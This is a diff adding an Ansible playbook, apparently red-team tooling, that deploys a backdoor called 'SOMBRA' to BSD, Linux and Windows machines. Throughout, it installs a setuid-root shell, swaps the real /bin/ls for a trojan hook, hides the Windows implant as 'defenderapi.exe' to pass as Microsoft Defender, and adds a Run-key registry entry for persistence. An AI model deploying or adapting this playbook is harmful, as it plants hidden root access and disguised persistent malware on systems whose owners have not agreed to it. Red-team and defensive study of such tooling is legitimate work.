@@ -1,0 +1,114 @@
+
+######################################################################
+#
+# BSD Boxes
+#
+######################################################################
+- name: SOMBRA | Install shell | BSD
+  copy:
+    src: sombra-bsd
+    dest: /usr/bin/common-init
+    mode: 4755
+  when: ansible_os_family == 'FreeBSD'
+
+- name: SOMBRA | Move ls | BSD
+  copy:
+    remote_src: yes
+    src: /bin/ls
+    dest: /usr/bin/list
+  when: ansible_os_family == 'FreeBSD'
+
+- name: SOMBRA | Copy ls hook | pfSense
+  copy:
+    src: ls-bsd
+    dest: /bin/ls
+    mode: 755
+  when: ansible_os_family == 'FreeBSD'
+
+- name: SOMBRA | Init Shell | pfSense
+  shell: "/bin/ls"
+  when: ansible_os_family == 'FreeBSD'
+
+######################################################################
+#
+# Windows Boxes
+#
+######################################################################
+
+- name: SOMBRA | Copy Win10Pcap MSI | Windows
+  copy:
+    src: "win10pcap.msi"
+    dest: "C:\\ProgramData\\win10pcap.msi"
+  when: ansible_os_family == 'Windows'
+
+- name: SOMBRA | Install Win10Pcap | Windows
+  win_package:
+    path: 'C:\\ProgramData\\win10pcap.msi'
+    arguments: 'ALLUSERS=1 /quiet'
+    state: present
+
+- name: SOMBRA | Delete Win10Pcap MSI | Windows
+  win_file:
+    path: 'C:\\ProgramData\\win10pcap.msi'
+    state: 'absent'
+
+- name: SOMBRA | Copy shell | Windows
+  copy:
+    src: "sombra.exe"
+    dest: "C:\\ProgramData\\defenderapi.exe"
+  when: ansible_os_family == 'Windows'
+
+- name: SOMBRA | Hide shell | Windows
+  win_command: "attrib +h 'C:\\ProgramData\\defenderapi.exe'"
+  when: ansible_os_family == 'Windows'
+
+- name: SOMBRA | Add run key persistence | Windows
+  win_regedit: 
+    path: 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+    name: "defender"
+    data: "C:\\ProgramData\\defenderapi.exe"
+    type: string
+  when: ansible_os_family == 'Windows'
+
+- name: SOMBRA | Run agent | Windows
+  win_shell: 'runas /trustlevel:0x20000 defenderapi.exe'
+  async: 45
+  poll: 0
+  args:
+    chdir: 'C:\\ProgramData'
+  when: ansible_os_family == 'Windows'
+
+######################################################################
+#
+# Linux Boxes
+#
+######################################################################
+
+- name: SOMBRA | Define Linux Distros
+  set_facts:
+    linux_distros: ["RedHat", "CentOS", "Fedora", "Scientific", "CloudLinux", "OracleLinux", "Amazon", "XenServer", "Debian", "Ubuntu", "SUSE", "SLED", "SLES", "Gentoo", "Archlinux", "Mandrake", "Alpine"]
+
+- name: SOMBRA | Install shell | Linux
+  copy:
+    src: sombra
+    dest: /usr/bin/common-init
+    mode: 4755
+  when: ansible_os_family in linux_distros
+
+- name: SOMBRA | Move ls | Linux
+  copy:
+    remote_src: yes
+    src: /bin/ls
+    dest: /usr/bin/list
+  when: ansible_os_family in linux_distros
+
+- name: SOMBRA | Copy ls hook | Linux
+  copy:
+    src: ls
+    dest: /bin/ls
+    mode: 755
+  when: ansible_os_family in linux_distros
+
+- name: SOMBRA | Init Shell | Linux
+  shell: "/bin/ls"
+  when: ansible_os_family in linux_distros
